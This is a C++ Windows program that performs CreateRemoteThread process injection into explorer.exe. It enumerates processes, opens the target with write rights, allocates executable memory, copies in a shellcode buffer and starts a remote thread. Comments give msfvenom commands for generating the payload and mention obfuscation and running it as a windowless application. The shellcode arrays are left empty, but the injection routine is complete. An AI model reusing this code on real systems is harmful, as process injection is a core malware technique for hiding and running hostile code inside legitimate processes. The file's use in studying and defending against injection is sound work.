#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
using namespace std;
///https://tbhaxor.com/createremotethread-process-injection/
DWORD ProcIDEnum(string TargetProc) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);
    do
    {
        //#Process Enumerator
        // -------------------
        //in Project>>Properties>>Configuration Properties>>Advanced>>==>Set Charset to No Charset or  wcout << "Process : " << pe32.szExeFile << L" id: " << pe32.th32ProcessID << endl
        //                                                            ==>Set Use Debug Libaries NO        
        //cout << "Process : " << pe32.szExeFile <<" == ID is : " << pe32.th32ProcessID <<endl;


        string procname = pe32.szExeFile;
        DWORD TargetPID = pe32.th32ProcessID;

        if (procname.compare(TargetProc) == 0)
        {

            //cout << "Process : " << procname << " == ID is : " << TargetPID << endl;
            return TargetPID;
            break;
        }


    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    /*
//msfvenom -p windows/x64/messagebox  EXITFUNC=thread  -e dynamic/xor -f csharp
unsigned char payload[] = {  };
    */
//msfvenom -p windows/x64/exec CMD=calc.exe  EXITFUNC=thread  -f csharp
unsigned char payload[] = {  };






    DWORD pid =ProcIDEnum("explorer.exe");
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    LPVOID pRemoteCode = VirtualAllocEx(hProc, NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)sizeof(payload), (SIZE_T*)NULL);
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    WaitForSingleObject(hThread, -2);
    FreeConsole();
    return 0;
    //Obfusccation 
    // Windows Application
  

}

